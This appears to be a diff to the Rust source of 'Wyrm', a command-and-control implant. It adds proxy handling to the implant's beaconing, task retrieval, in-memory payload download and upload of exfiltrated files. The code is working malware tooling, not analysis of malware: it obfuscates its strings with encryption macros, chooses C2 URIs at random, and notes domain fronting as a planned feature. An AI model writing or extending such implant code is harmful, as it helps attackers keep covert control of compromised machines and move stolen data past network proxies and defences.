@@ -9,6 +9,7 @@ use crate::{
 // use minreq::Response;
 use rand::Rng;
 use reqwest::{
+    Url,
     blocking::{
         ClientBuilder, Response,
         multipart::{Form, Part},
@@ -24,7 +25,7 @@ use shared::{
 use str_crypter::{decrypt_string, sc};
 
 /// Constructs the C2 URL by randomly choosing the URI to visit.
-fn construct_c2_url(implant: &Wyrm) -> String {
+pub fn construct_c2_url(implant: &Wyrm) -> String {
     let mut rng = rand::rng();
     let i = rng.random_range(0..implant.c2_config.api_endpoints.len());
 
@@ -74,7 +75,7 @@ pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, reqwest::Err
 
     // Make the actual request, depending upon whether we have data to upload or not
     let response = if implant.completed_tasks.is_empty() {
-        http_get(formatted_url.clone(), headers)?
+        http_get(formatted_url.clone(), headers, implant)?
     } else {
         http_post_tasks(formatted_url.clone(), implant, headers)?
     };
@@ -105,10 +106,16 @@ pub fn comms_http_check_in(implant: &mut Wyrm) -> Result<Vec<Task>, reqwest::Err
     Ok(decode_tasks_stream(&response_bytes))
 }
 
-fn http_get(url: String, headers: HeaderMap) -> Result<Response, reqwest::Error> {
+fn http_get(url: String, headers: HeaderMap, implant: &Wyrm) -> Result<Response, reqwest::Error> {
+    let dest = Url::parse(&url).unwrap();
+
     let client_builder = reqwest::blocking::ClientBuilder::new();
+    let client_builder = implant
+        .c2_config
+        .apply_proxy_for_c2_url(&url, client_builder)?;
+
     let client = client_builder.default_headers(headers).build()?;
-    client.get(url).send()
+    client.get(dest).send()
 }
 
 fn http_post_tasks(
@@ -116,6 +123,11 @@ fn http_post_tasks(
     implant: &mut Wyrm,
     mut headers: HeaderMap,
 ) -> Result<Response, reqwest::Error> {
+    let client_builder = reqwest::blocking::ClientBuilder::new();
+    let client_builder = implant
+        .c2_config
+        .apply_proxy_for_c2_url(&url, client_builder)?;
+
     let mut completed_tasks: TasksNetworkStream = Vec::new();
 
     //
@@ -135,7 +147,6 @@ fn http_post_tasks(
 
     headers.insert(CONTENT_TYPE, "application/json".parse().unwrap());
 
-    let client_builder = reqwest::blocking::ClientBuilder::new();
     let client = client_builder.default_headers(headers).build()?;
 
     // TODO domain fronting in the above builder?
@@ -236,7 +247,7 @@ pub fn download_file_with_uri_in_memory(uri: &str, wyrm: &Wyrm) -> Result<Vec<u8
     let ua = &wyrm.c2_config.useragent;
     let headers = generate_generic_headers(&wyrm.implant_id, sec_token, ua);
 
-    let response = http_get(formatted_url, headers)?;
+    let response = http_get(formatted_url, headers, wyrm)?;
 
     Ok(response.bytes().unwrap_or_default().to_vec())
 }
@@ -287,6 +298,14 @@ pub fn upload_file_as_stream(implant: &Wyrm, ef: &ExfiltratedFile) {
         &implant.c2_config.useragent,
     );
     let cb = ClientBuilder::new();
+    let Ok(cb) = implant.c2_config.apply_proxy_for_c2_url(&url, cb) else {
+        print_failed(format!(
+            "{}",
+            sc!("Failed to look for proxy during upload.", 63).unwrap()
+        ));
+        return;
+    };
+
     let client = cb
         .default_headers(headers)
         .redirect(Policy::none())
